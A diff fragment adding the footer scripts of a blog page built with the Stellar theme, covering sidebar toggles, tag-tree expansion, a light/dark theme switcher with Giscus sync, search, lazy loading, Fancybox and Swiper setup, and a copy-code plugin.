+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+
+<!-- required -->
+<script src="/js/main.js?v=1.29.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    applyThemeToGiscus(theme)
+  }
+
+  const applyThemeToGiscus = (theme) => {
+    theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+      auto: `切换到跟随系统配色`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    }
+  })()
+</script>
+
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@19.1.3/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+</script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error)';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const els = document.getElementsByClassName('ds-memos');
+    if (els != undefined && els.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+</div></body></html>
